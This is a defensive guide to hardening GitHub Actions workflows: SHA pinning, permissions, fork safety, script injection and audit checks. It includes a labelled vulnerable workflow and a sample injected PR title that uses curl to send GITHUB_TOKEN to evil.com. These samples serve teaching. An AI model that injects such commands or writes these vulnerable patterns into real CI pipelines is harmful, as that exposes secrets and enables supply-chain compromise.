# Security Hardening

Sources: GitHub Actions security hardening guide (2026), OSSF Scorecard, tj-actions/changed-files supply chain incident (March 2025), StepSecurity harden-runner, Dependabot documentation

Covers: SHA pinning, permissions lockdown, supply chain attack prevention, fork safety, Dependabot for Actions, artifact attestations, and audit procedures.

## The Supply Chain Threat

GitHub Actions execute third-party code in your CI/CD pipeline. A compromised action can:

- Exfiltrate secrets to an external server
- Modify build outputs (inject malicious code into artifacts)
- Escalate permissions using GITHUB_TOKEN
- Persist access by modifying workflow files

### The tj-actions Incident (March 2025)

The `tj-actions/changed-files` action (23,000+ repos) was compromised through a stolen PAT. The attacker modified the action to dump CI secrets from all repositories using it. Impact: secrets from thousands of repos exposed, including at Coinbase.

**Root cause**: Repositories referenced the action by mutable tag (`@v44`), not by immutable SHA. When the tag was force-pushed to malicious code, all consuming workflows ran the attacker's version.

**Lesson**: Tags are mutable references. SHA commits are immutable. Always pin to SHA.

## SHA Pinning

### Pin Third-Party Actions to Full SHA

```yaml
# VULNERABLE — tag can be force-pushed to malicious code
- uses: actions/checkout@v4

# SECURE — immutable reference, comment documents the version
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.7
```

### Finding the SHA

```bash
# Get the SHA for a specific tag
gh api repos/actions/checkout/git/ref/tags/v4.1.7 --jq '.object.sha'

# Or browse the repo releases page
```

### Exception: First-Party Actions

GitHub-maintained actions (`actions/*`) have additional protections. SHA pinning is still recommended but the risk is lower than community actions. Prioritize pinning:

1. **Always pin**: Community/third-party actions
2. **Strongly recommended**: Verified creator actions
3. **Recommended**: `actions/*` (GitHub-maintained)

## Automated SHA Updates

### Dependabot for Actions

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns: ["*"]
```

Dependabot creates PRs when new action versions are available, updating the SHA and comment. Group updates to reduce PR noise.

### Renovate Alternative

```json
{
  "extends": ["config:recommended"],
  "github-actions": {
    "enabled": true,
    "pinDigests": true
  }
}
```

Renovate also supports SHA pinning and auto-update.

## Permissions Lockdown

### Principle of Least Privilege

```yaml
# Step 1: Deny all at workflow level
permissions: {}

# Step 2: Grant minimum per job
jobs:
  test:
    permissions:
      contents: read
    runs-on: ubuntu-latest

  deploy:
    permissions:
      contents: read
      id-token: write
      deployments: write
    runs-on: ubuntu-latest
```

### Repository-Level Default

Set the repository default to **restricted** (read-only):

Settings > Actions > General > Workflow permissions > "Read repository contents and packages permissions"

This ensures new workflows start with minimal access.

### Common Permission Patterns

| Task | Required Permissions |
|------|---------------------|
| Checkout and test code | `contents: read` |
| Push to repo (commit, tag) | `contents: write` |
| Comment on PR | `pull-requests: write` |
| Create deployment status | `deployments: write` |
| OIDC cloud auth | `id-token: write` |
| Upload to GitHub Packages | `packages: write` |
| Create artifact attestation | `attestations: write`, `id-token: write` |
| Publish to GitHub Pages | `pages: write`, `id-token: write` |
| Manage issues | `issues: write` |

## Fork Safety

### pull_request vs pull_request_target

| Aspect | pull_request | pull_request_target |
|--------|-------------|-------------------|
| Runs code from | PR branch (fork) | Base branch |
| GITHUB_TOKEN | Read-only | Full permissions |
| Secrets access | No (fork PRs) | Yes (base repo secrets) |
| Safe for forks | Yes | Dangerous if checking out PR code |

### Dangerous Anti-Pattern

```yaml
# NEVER do this — gives fork code access to secrets
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out FORK code
      - run: npm test  # Runs FORK code with base repo secrets
```

### Safe Two-Workflow Pattern

```yaml
# Workflow 1: CI (safe for forks)
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4    # PR code, no secrets
      - run: npm test

# Workflow 2: Label (base context, no fork code)
on:
  pull_request_target:
    types: [opened]
jobs:
  label:
    permissions:
      pull-requests: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5     # No checkout of PR code
```

## Script Injection Prevention

Untrusted input in `run:` commands can inject shell commands:

```yaml
# VULNERABLE — attacker sets PR title to: "; curl evil.com/steal?token=$GITHUB_TOKEN"
- run: echo "PR title is ${{ github.event.pull_request.title }}"

# SAFE — use env variable (shell escaping applies)
- run: echo "PR title is $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

### Untrusted Contexts

These contexts contain user-controlled input — never interpolate directly in `run:`:

| Context | Risk |
|---------|------|
| `github.event.pull_request.title` | PR author controls |
| `github.event.pull_request.body` | PR author controls |
| `github.event.issue.title` | Issue author controls |
| `github.event.issue.body` | Issue author controls |
| `github.event.comment.body` | Comment author controls |
| `github.event.head_commit.message` | Committer controls |
| `github.head_ref` | Branch name (attacker-chosen) |

Always map to `env:` variables instead of inline `${{ }}` interpolation.

## Artifact Attestations

Create unfalsifiable provenance records for build artifacts:

```yaml
jobs:
  build:
    permissions:
      id-token: write
      contents: read
      attestations: write
    steps:
      - uses: actions/checkout@v4
      - run: npm run build
      - uses: actions/attest-build-provenance@v2
        with:
          subject-path: 'dist/**'
```

Verify attestations:

```bash
gh attestation verify dist/bundle.js --repo owner/repo
```

## StepSecurity Harden-Runner

Network and process monitoring for GitHub Actions runners:

```yaml
- uses: step-security/harden-runner@v2
  with:
    egress-policy: audit           # 'audit' to monitor, 'block' to enforce
    allowed-endpoints: >
      github.com:443
      registry.npmjs.org:443
```

Detects unexpected outbound network calls — first sign of a compromised action.

## Security Audit Checklist

| Check | How | Priority |
|-------|-----|----------|
| All third-party actions pinned to SHA | Search for `uses:` without `@SHA` | Critical |
| Top-level `permissions: {}` | Check workflow `permissions:` | Critical |
| No `pull_request_target` + checkout | Search for dangerous pattern | Critical |
| No secret interpolation in `run:` | Search for `${{ secrets.` in `run:` | High |
| No untrusted input in `run:` | Search for `${{ github.event.` in `run:` | High |
| Dependabot for Actions enabled | Check `.github/dependabot.yml` | High |
| Environment protection on production | Check repo Settings > Environments | High |
| OIDC instead of long-lived credentials | Search for cloud credential secrets | Medium |
| Artifact attestations for releases | Check release workflows | Medium |
| Branch restrictions on deployment | Check environment settings | Medium |

## Automated Security Scanning

```bash
# OSSF Scorecard — grades repo security practices
gh api repos/{owner}/{repo}/community/profile

# Step Security — scan all workflows
npx @stepsecurity/secure-repo
```

Use the OSSF Scorecard GitHub Action to continuously monitor:

```yaml
- uses: ossf/scorecard-action@v2
  with:
    results_file: results.sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```
